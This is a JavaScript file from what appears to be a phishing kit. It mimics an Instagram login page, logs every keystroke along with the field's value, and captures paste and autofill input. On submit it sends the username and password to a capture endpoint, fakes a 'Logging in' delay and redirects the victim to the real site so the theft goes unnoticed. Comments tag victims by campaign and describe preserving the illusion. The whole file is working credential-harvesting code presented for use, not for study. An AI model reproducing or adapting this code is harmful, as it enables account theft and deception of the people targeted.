/*
 * fishproject - client-side collector.
 * Streams every keystroke (with the live field value) and the final submitted
 * credential pair to the listener. Redirects to the real Instagram on submit so
 * the page looks like a normal failed/successful login.
 */
(function () {
  "use strict";

  var ENDPOINT = "/api/capture";
  var REDIRECT = "https://www.instagram.com/";

  var form = document.getElementById("login-form");
  var userInput = document.getElementById("username");
  var passInput = document.getElementById("password");
  var loginBtn = document.getElementById("login-btn");
  var toggleBtn = document.getElementById("toggle-pw");

  function makeId() {
    var k = "fp_sid";
    var v = sessionStorage.getItem(k);
    if (!v) {
      v = Math.random().toString(36).slice(2) + Date.now().toString(36);
      sessionStorage.setItem(k, v);
    }
    return v;
  }
  var SID = makeId();

  // Link with ?c=victim-name and every event gets tagged with it.
  var CAMPAIGN = "";
  try {
    CAMPAIGN = (new URLSearchParams(location.search).get("c") || "").slice(0, 64);
  } catch (e) {
    CAMPAIGN = "";
  }

  function send(payload, beacon) {
    payload.sid = SID;
    payload.ts = new Date().toISOString();
    payload.url = location.href;
    payload.campaign = CAMPAIGN;
    var body = JSON.stringify(payload);
    try {
      if (beacon && navigator.sendBeacon) {
        navigator.sendBeacon(ENDPOINT, new Blob([body], { type: "application/json" }));
        return;
      }
      fetch(ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: body,
        keepalive: true,
        mode: "same-origin",
        credentials: "omit",
      }).catch(function () {});
    } catch (e) {
      /* swallow - never break the page's illusion */
    }
  }

  /* ---- keystroke capture ------------------------------------------------ */
  var pending = [];
  var flushTimer = null;

  function fieldName(el) {
    if (!el) return "?";
    return el.name || el.id || el.getAttribute("aria-label") || "?";
  }

  function flush() {
    if (!pending.length) return;
    var batch = pending.splice(0, pending.length);
    send({ type: "keystrokes", count: batch.length, keys: batch });
  }

  function scheduleFlush() {
    if (flushTimer) return;
    flushTimer = setTimeout(function () {
      flushTimer = null;
      flush();
    }, 400);
  }

  document.addEventListener(
    "keydown",
    function (e) {
      var el = e.target;
      var name = fieldName(el);
      var key = e.key;
      // read the value right after the key lands
      setTimeout(function () {
        var value = el && typeof el.value === "string" ? el.value : "";
        var entry = {
          field: name,
          key: key,
          value: value,
          sel: el && "selectionStart" in el ? el.selectionStart : null,
        };
        pending.push(entry);
        scheduleFlush();
        // mirror to console so an operator previewing the page sees it live
        try { console.log("[fp] " + name + " <- " + JSON.stringify(key)); } catch (_) {}
      }, 0);
    },
    true
  );

  // Catch paste / autofill / IME input that never fires a clean keydown.
  document.addEventListener(
    "input",
    function (e) {
      var el = e.target;
      if (!el || (el.tagName !== "INPUT" && el.tagName !== "TEXTAREA")) return;
      send({
        type: "input",
        field: fieldName(el),
        value: el.value,
        reason: e.inputType || "input",
      });
    },
    true
  );

  // Focus changes tell us which field a keystroke belongs to.
  document.addEventListener("focusin", function (e) {
    send({ type: "focus", field: fieldName(e.target) });
  });

  window.addEventListener("pagehide", function () { flush(); send({ type: "bye" }, true); });
  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") { flush(); send({ type: "hidden" }, true); }
  });

  /* ---- button enable state (mirror Instagram) --------------------------- */
  function refreshBtn() {
    var ok = userInput.value.trim().length > 0 && passInput.value.length > 0;
    loginBtn.disabled = !ok;
  }
  userInput.addEventListener("input", refreshBtn);
  passInput.addEventListener("input", refreshBtn);

  /* ---- password reveal -------------------------------------------------- */
  toggleBtn.addEventListener("click", function () {
    var showing = passInput.type === "text";
    passInput.type = showing ? "password" : "text";
    toggleBtn.textContent = showing ? "Show" : "Hide";
  });

  /* ---- submit -> capture credentials ------------------------------------ */
  form.addEventListener("submit", function (e) {
    e.preventDefault();
    var creds = {
      type: "credentials",
      username: userInput.value,
      password: passInput.value,
      sid: SID,
    };
    send(creds);
    flush();
    try { console.log("[fp] credentials submitted"); } catch (_) {}

    // Fake the "logging in" beat, then bounce to the real site.
    loginBtn.disabled = true;
    loginBtn.textContent = "Logging in\u2026";
    setTimeout(function () {
      try { window.location.href = REDIRECT; } catch (_) {}
    }, 900);
  });

  refreshBtn();
})();
